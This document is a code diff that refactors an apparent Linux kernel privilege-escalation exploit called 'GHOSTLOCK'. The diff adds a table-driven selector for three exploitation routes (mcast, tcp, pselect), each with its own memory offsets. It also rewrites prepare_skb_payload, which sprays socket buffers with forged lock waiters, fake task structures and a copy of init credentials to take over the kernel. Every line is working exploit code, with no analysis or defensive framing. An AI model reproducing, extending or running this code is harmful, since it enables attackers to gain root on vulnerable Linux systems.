@@ -50,25 +50,48 @@ void clear_pselect_write(void) {
   pselect_custom_target = 0;
 }
 
-int tcp_route_selected(void) {
-  /* compact defaults to tcp; GHOSTLOCK_TCP_ROUTE=0 selects pselect */
-  const char *s = getenv("GHOSTLOCK_TCP_ROUTE");
-  if (s && *s && strcmp(s, "0") == 0) {
-    return 0;
-  }
-  return active_offsets && active_offsets->compact_waiter;
-}
-
-int kernel5_route_selected(void) {
-  const char *s = getenv("GHOSTLOCK_ROUTE");
-  if (s && *s) {
-    return strcmp(s, "mcast") == 0;
-  }
+static int fit_mcast(void) {
   return active_offsets && active_offsets->mcast_waiter_off > 0 &&
          active_offsets->mcast_buffer_size > 0 &&
          (uint32_t)active_offsets->mcast_waiter_off +
                  active_offsets->mcast_lock_offset + 8 <=
              active_offsets->mcast_buffer_size;
+}
+
+static int fit_tcp(void) {
+  return active_offsets && active_offsets->compact_waiter;
+}
+
+/* First fitted entry wins. tcp's window is sizeof(struct
+ * tcp_zerocopy_receive), always wide enough for the waiter frame, so only
+ * compactness decides its fit. */
+static const struct route routes[] = {
+    {"mcast", fit_mcast, do_kernel5_fake_lock_route, 1, 0, 0xe80,
+     TCP_FAKE_TASK_OFF, TCP_CRED_COPY_OFF},
+    {"tcp", fit_tcp, do_tcp_fake_lock_route, 1, 0, 0xe80, TCP_FAKE_TASK_OFF,
+     TCP_CRED_COPY_OFF},
+    {"pselect", NULL, do_pselect_fake_lock_route, 0, SKB_DATA_DELTA,
+     SKB_FRAG_BIAS, FAKE_TASK_OFF, CRED_COPY_OFF},
+};
+
+static int route_env_mismatch(const char *name) {
+  const char *s = getenv("GHOSTLOCK_ROUTE");
+  return s && *s && strcmp(s, name) != 0;
+}
+
+/* Env restricts the eligible set, never enables: a forced route still has
+ * to pass its fit. */
+const struct route *select_route(void) {
+  const char *s = getenv("GHOSTLOCK_TCP_ROUTE");
+  int veto_tcp = s && *s && strcmp(s, "0") == 0;
+  for (size_t i = 0; i < sizeof(routes) / sizeof(routes[0]); i++) {
+    const struct route *r = &routes[i];
+    if (strcmp(r->name, "tcp") == 0 && veto_tcp) continue;
+    if (route_env_mismatch(r->name)) continue;
+    if (r->fit && !r->fit()) continue;
+    return r;
+  }
+  return NULL;
 }
 
 void setup_kernelsnitch(void) {
@@ -348,16 +371,17 @@ void prepare_ctxs(void) {
 int prepare_skb_payload(uintptr_t base) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
-  int tcp = tcp_route_selected();
-  long long payload_delta = tcp ? 0 : SKB_DATA_DELTA;
-  size_t chunk_bias = tcp ? 0xe80 : (size_t)SKB_FRAG_BIAS;
-  size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t)FAKE_TASK_OFF;
+  const struct route *r = select_route();
+  if (!r) {
+    pr_error("no feasible route for this profile\n");
+    return 0;
+  }
 
-  uintptr_t payload_base = base + payload_delta;
+  uintptr_t payload_base = base + r->payload_delta;
 
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
-  fake_task = payload_base + fake_task_off;
+  fake_task = payload_base + r->fake_task_off;
   fake_fops = payload_base + FOPS_TABLE_OFF;
   if (pselect_custom_write) {
     if (pselect_child_node) {
@@ -373,7 +397,7 @@ int prepare_skb_payload(uintptr_t base) {
     }
     fake_left = 0;
     if (pselect_custom_write == 2) {
-      fake_fops = payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
+      fake_fops = payload_base + r->cred_copy_off;
     }
     fake_parent = pselect_custom_target - 8;
   }
@@ -388,7 +412,7 @@ int prepare_skb_payload(uintptr_t base) {
   int compact = active_offsets && active_offsets->compact_waiter;
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
-    unsigned char *p = skb_buf + chunk + chunk_bias;
+    unsigned char *p = skb_buf + chunk + r->chunk_bias;
 
     put32(p, LOCK_OFF + 0x00, 0);
     put64(p, LOCK_OFF + 0x08, fake_w0);
@@ -454,16 +478,16 @@ int prepare_skb_payload(uintptr_t base) {
     uint32_t ft_pi_blocked_off = compact ? active_offsets->task_pi_blocked_on
                                          : FAKE_TASK_PI_BLOCKED_ON_OFF;
 
-    put32(p, fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
-    put32(p, fake_task_off + ft_prio_off, FAKE_TASK_PRIO);
-    put32(p, fake_task_off + ft_nprio_off, FAKE_TASK_PRIO);
-    put32(p, fake_task_off + ft_pi_lock_off, 0);
+    put32(p, r->fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
+    put32(p, r->fake_task_off + ft_prio_off, FAKE_TASK_PRIO);
+    put32(p, r->fake_task_off + ft_nprio_off, FAKE_TASK_PRIO);
+    put32(p, r->fake_task_off + ft_pi_lock_off, 0);
     /* Empty PI waiters avoid tree rebalancing during reinsertion. */
-    put64(p, fake_task_off + ft_pi_wait_off, 0);
-    put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
-    put64(p, fake_task_off + ft_tg_off, task_group);
-    put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
-    put64(p, fake_task_off + ft_pi_blocked_off, 0);
+    put64(p, r->fake_task_off + ft_pi_wait_off, 0);
+    put64(p, r->fake_task_off + ft_pi_wait_off + 0x08, 0);
+    put64(p, r->fake_task_off + ft_tg_off, task_group);
+    put64(p, r->fake_task_off + ft_pi_top_off, pi_top_task);
+    put64(p, r->fake_task_off + ft_pi_blocked_off, 0);
 
     put64(p, RIGHT_OFF + 0x00, fake_parent);
     put64(p, RIGHT_OFF + 0x08, 0);
@@ -474,7 +498,7 @@ int prepare_skb_payload(uintptr_t base) {
     put64(p, LEFT_OFF + 0x10, 0);
 
     if (pselect_custom_write >= 2) {
-      fill_init_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
+      fill_init_cred_copy(p, r->cred_copy_off);
     }
   }
   return 1;
